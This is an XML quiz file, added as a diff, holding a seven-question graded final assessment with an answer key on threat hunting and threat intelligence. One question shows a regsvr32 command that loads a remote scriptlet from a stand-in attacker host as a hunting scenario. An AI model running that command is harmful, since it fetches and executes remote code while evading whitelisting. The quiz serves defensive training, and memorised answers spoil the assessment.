@@ -1,0 +1,209 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<quiz>
+  <name>Session 07 Final Quiz: Cyber Threat Hunting and Intelligence Gathering</name>
+  <description>Final mastery assessment for Session 07. 7 multiple choice questions. Passing score: 5/7.</description>
+
+  <question type="multichoice">
+    <name>
+      <text>Final Q1: DNS Tunneling Detection</text>
+    </name>
+    <questiontext format="html">
+      <text><![CDATA[<p>An analyst discovers that a host in the environment has made 1,847 DNS queries in 24 hours — compared to the environment baseline of ~55 queries/day. Most of the queries are for TXT records with random-looking subdomain names like <code>a3f2.telemetry-check.io</code>. What technique is MOST likely being used?</p>]]></text>
+    </questiontext>
+    <defaultgrade>1</defaultgrade>
+    <penalty>0.25</penalty>
+    <shuffleanswers>1</shuffleanswers>
+    <answernumbering>ABCD</answernumbering>
+    <answer fraction="0">
+      <text>T1566.001 - Spearphishing Attachment</text>
+      <feedback><text>Spearphishing describes initial access via malicious email attachments. The DNS anomaly pattern described here occurs post-compromise, not during initial delivery.</text></feedback>
+    </answer>
+    <answer fraction="100">
+      <text>T1071.004 - Application Layer Protocol: DNS (DNS Tunneling)</text>
+      <feedback><text>Correct. High-volume DNS TXT record queries to random subdomains of a single domain is a signature pattern of DNS tunneling. Attackers encode C2 commands in DNS TXT responses and exfiltrate data in DNS query subdomains, because DNS is almost universally allowed through firewalls.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>T1018 - Remote System Discovery</text>
+      <feedback><text>Remote System Discovery involves enumerating other systems on the network (e.g., using net.exe, arp, ping). High-volume DNS TXT queries are not characteristic of discovery.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>T1048.003 - Exfiltration Over Alternative Protocol</text>
+      <feedback><text>While DNS tunneling can be used for exfiltration, T1048.003 specifically refers to non-standard protocols like DNS or ICMP for exfiltration. The broader C2+exfiltration pattern via DNS is best captured by T1071.004. T1048.003 is also a valid answer if exfiltration is confirmed, but T1071.004 is more specific to the described pattern.</text></feedback>
+    </answer>
+  </question>
+
+  <question type="multichoice">
+    <name>
+      <text>Final Q2: Sigma Rule Condition Field</text>
+    </name>
+    <questiontext format="html">
+      <text><![CDATA[<p>When writing a Sigma rule, what is the purpose of the <code>condition</code> field in the <code>detection</code> section?</p>]]></text>
+    </questiontext>
+    <defaultgrade>1</defaultgrade>
+    <penalty>0.25</penalty>
+    <shuffleanswers>1</shuffleanswers>
+    <answernumbering>ABCD</answernumbering>
+    <answer fraction="0">
+      <text>It specifies the SIEM platform the rule is written for.</text>
+      <feedback><text>Sigma rules are SIEM-independent. The target SIEM is specified during conversion (e.g., sigma-cli -t splunk). The condition field is not platform-specific.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>It defines the log source type and product the rule applies to.</text>
+      <feedback><text>Log source (type, product, service) is defined in the <code>logsource</code> section of a Sigma rule, not the condition.</text></feedback>
+    </answer>
+    <answer fraction="100">
+      <text>It expresses the boolean logic combining selection and filter blocks to determine when an alert fires.</text>
+      <feedback><text>Correct. The condition field in Sigma detection uses boolean operators (and, or, not) and quantifiers (1 of, all of) to combine named selection and filter blocks. Example: "selection_main and not filter_legitimate" means: match the selection AND exclude the filter. This determines exactly when the rule fires.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>It sets the alert severity level (informational, low, medium, high, critical).</text>
+      <feedback><text>Severity is defined in the top-level <code>level</code> field of a Sigma rule (e.g., level: high). The condition field handles matching logic, not severity.</text></feedback>
+    </answer>
+  </question>
+
+  <question type="multichoice">
+    <name>
+      <text>Final Q3: Pyramid of Pain Top Level</text>
+    </name>
+    <questiontext format="html">
+      <text><![CDATA[<p>The Pyramid of Pain model categorizes indicators by how difficult they are for attackers to change. Which type of indicator sits at the <strong>TOP</strong> of the pyramid, representing the most painful (difficult) change for an attacker?</p>]]></text>
+    </questiontext>
+    <defaultgrade>1</defaultgrade>
+    <penalty>0.25</penalty>
+    <shuffleanswers>1</shuffleanswers>
+    <answernumbering>ABCD</answernumbering>
+    <answer fraction="0">
+      <text>File hashes (MD5, SHA256)</text>
+      <feedback><text>File hashes sit at the BOTTOM of the Pyramid of Pain — they are the easiest for attackers to change (trivial: just modify one byte). They have the least impact when used as the primary detection mechanism.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>IP addresses</text>
+      <feedback><text>IP addresses are near the bottom of the pyramid — Easy to change. Attackers can spin up new infrastructure in minutes or use VPNs and proxies to rotate IPs rapidly.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>Domain names</text>
+      <feedback><text>Domain names are low on the pyramid — Simple to change. New domains cost under $10 and can be registered anonymously. Attackers rotate domain infrastructure regularly.</text></feedback>
+    </answer>
+    <answer fraction="100">
+      <text>Tactics, Techniques, and Procedures (TTPs)</text>
+      <feedback><text>Correct. TTPs sit at the top of the Pyramid of Pain. Changing fundamental tradecraft — how an attacker operates, what tools they prefer, how they achieve their goals — requires significant effort, retraining, and new tool development. When defenders detect at the TTP level, they force attackers to make expensive changes to their operations.</text></feedback>
+    </answer>
+  </question>
+
+  <question type="multichoice">
+    <name>
+      <text>Final Q4: MISP Attributes vs Objects</text>
+    </name>
+    <questiontext format="html">
+      <text><![CDATA[<p>In MISP, what is the difference between an <strong>Attribute</strong> and an <strong>Object</strong>?</p>]]></text>
+    </questiontext>
+    <defaultgrade>1</defaultgrade>
+    <penalty>0.25</penalty>
+    <shuffleanswers>1</shuffleanswers>
+    <answernumbering>ABCD</answernumbering>
+    <answer fraction="0">
+      <text>Attributes are used for IP addresses only; Objects are used for all other indicator types.</text>
+      <feedback><text>Incorrect. Attributes can be any indicator type in MISP — ip-dst, domain, sha256, email-src, filename, etc. The distinction is not by type but by complexity (single data point vs. grouped entity).</text></feedback>
+    </answer>
+    <answer fraction="100">
+      <text>Attributes are single data points (e.g., one IP or one hash); Objects group multiple related attributes representing a single entity (e.g., a file with its name, hash, and size).</text>
+      <feedback><text>Correct. An Attribute is one piece of data (type + value). An Object uses a template to group multiple attributes that describe the same real-world entity — for example, a malware file Object contains filename, sha256, md5, size-in-bytes, and mimetype as separate but linked attributes.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>Attributes require manual creation; Objects are automatically imported from threat feeds.</text>
+      <feedback><text>Both attributes and objects can be created manually or imported. The distinction has nothing to do with the creation method.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>Attributes are shared publicly; Objects are kept private to your organization.</text>
+      <feedback><text>Sharing in MISP is controlled by the event's distribution setting and tags (TLP), not by whether something is an attribute or object.</text></feedback>
+    </answer>
+  </question>
+
+  <question type="multichoice">
+    <name>
+      <text>Final Q5: Threat Hunting Maturity Level</text>
+    </name>
+    <questiontext format="html">
+      <text><![CDATA[<p>Your organization uses the threat hunting maturity model. Currently, your team performs ad-hoc searches for IOCs from threat feeds (e.g., looking up whether any known-bad IP appeared in your firewall logs). What maturity level does this represent, and what is the MOST important capability to develop next to advance to the next level?</p>]]></text>
+    </questiontext>
+    <defaultgrade>1</defaultgrade>
+    <penalty>0.25</penalty>
+    <shuffleanswers>1</shuffleanswers>
+    <answernumbering>ABCD</answernumbering>
+    <answer fraction="0">
+      <text>Level 0; advance by deploying a SIEM</text>
+      <feedback><text>Level 0 is purely reactive with no proactive hunting at all. IOC-based searching (even if ad-hoc) represents Level 1. A SIEM would be needed at Level 0, but this team is already past that point.</text></feedback>
+    </answer>
+    <answer fraction="100">
+      <text>Level 1; advance by developing hypothesis-driven hunts based on ATT&CK techniques</text>
+      <feedback><text>Correct. Searching for known IOCs from feeds is Level 1 (Minimal). Advancing to Level 2 (Procedural) requires moving beyond IOC searches to hypothesis-driven, TTP-based hunting using ATT&CK techniques as hunting targets, with documented procedures and reusable queries.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>Level 2; advance by implementing statistical anomaly detection</text>
+      <feedback><text>Level 2 is procedural/TTP-based hunting. Statistical anomaly detection characterizes Level 3 (Innovative). The team described has not yet reached Level 2.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>Level 3; advance by automating all detection into continuous pipelines</text>
+      <feedback><text>Continuous automated hunting characterizes Level 4. Ad-hoc IOC searching is Level 1, far from Level 3.</text></feedback>
+    </answer>
+  </question>
+
+  <question type="multichoice">
+    <name>
+      <text>Final Q6: Regsvr32 Squiblydoo Technique</text>
+    </name>
+    <questiontext format="html">
+      <text><![CDATA[<p>During a threat hunt, you find that <code>regsvr32.exe</code> executed with the argument <code>/i:https://attacker.com/payload.sct scrobj.dll</code>. Which ATT&CK technique does this represent, and why is it significant?</p>]]></text>
+    </questiontext>
+    <defaultgrade>1</defaultgrade>
+    <penalty>0.25</penalty>
+    <shuffleanswers>1</shuffleanswers>
+    <answernumbering>ABCD</answernumbering>
+    <answer fraction="0">
+      <text>T1059.001 - PowerShell; because regsvr32 is used to bypass PowerShell restrictions</text>
+      <feedback><text>This technique does not involve PowerShell. Regsvr32 directly executes COM scriptlets (.sct files) without invoking PowerShell.</text></feedback>
+    </answer>
+    <answer fraction="100">
+      <text>T1218.010 - System Binary Proxy Execution: Regsvr32; because regsvr32 is a trusted Windows binary that can execute remote scripts while bypassing application whitelisting</text>
+      <feedback><text>Correct. This is the "Squiblydoo" technique (T1218.010). Regsvr32.exe is a signed Windows binary in System32. The /i: flag with a URL allows loading a remote COM scriptlet (.sct file). Because it's a trusted signed binary, it bypasses AppLocker and WDAC application whitelisting. Scrobj.dll is the script runtime that processes the .sct file.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>T1190 - Exploit Public-Facing Application; because the attack came from an external URL</text>
+      <feedback><text>T1190 is about exploiting vulnerabilities in internet-facing applications for initial access. This event occurs post-compromise, with regsvr32 loading a payload — this is execution/defense evasion, not initial access.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>T1105 - Ingress Tool Transfer; because a file is downloaded from the internet</text>
+      <feedback><text>T1105 covers downloading additional tools/payloads from the internet. While a download occurs, the more specific and significant technique here is the use of regsvr32 as a trusted binary to bypass defenses (T1218.010), which is the primary significance of this finding.</text></feedback>
+    </answer>
+  </question>
+
+  <question type="multichoice">
+    <name>
+      <text>Final Q7: Diamond Model Purpose</text>
+    </name>
+    <questiontext format="html">
+      <text><![CDATA[<p>What is the Diamond Model of Intrusion Analysis primarily used for?</p>]]></text>
+    </questiontext>
+    <defaultgrade>1</defaultgrade>
+    <penalty>0.25</penalty>
+    <shuffleanswers>1</shuffleanswers>
+    <answernumbering>ABCD</answernumbering>
+    <answer fraction="0">
+      <text>Scoring the severity of a security incident based on business impact</text>
+      <feedback><text>Severity scoring is typically done with frameworks like CVSS (for vulnerabilities) or custom risk matrices. The Diamond Model is an analytical framework, not a scoring system.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>Mapping detected attacks to MITRE ATT&CK techniques in a standardized format</text>
+      <feedback><text>ATT&CK technique mapping is done using the MITRE ATT&CK framework itself. The Diamond Model predates ATT&CK and focuses on the relationships between four intrusion elements, not technique classification.</text></feedback>
+    </answer>
+    <answer fraction="100">
+      <text>Analyzing the relationships between adversary, infrastructure, capability, and victim to pivot and find related intrusions</text>
+      <feedback><text>Correct. The Diamond Model (Caltagirone, Pendergast, Betz 2013) represents intrusions as four core features: Adversary, Infrastructure, Capability, and Victim. Its primary analytical value is enabling pivoting — using known elements to discover unknown ones. For example, if you identify the adversary's infrastructure, you can pivot to find other victims; if you identify the malware capability, you can find other actors who use the same tool.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>Calculating the minimum detection time required to prevent a given type of data breach</text>
+      <feedback><text>The Diamond Model does not calculate detection times. It is a qualitative analytical framework for understanding intrusion relationships, not a quantitative time-based model.</text></feedback>
+    </answer>
+  </question>
+
+</quiz>
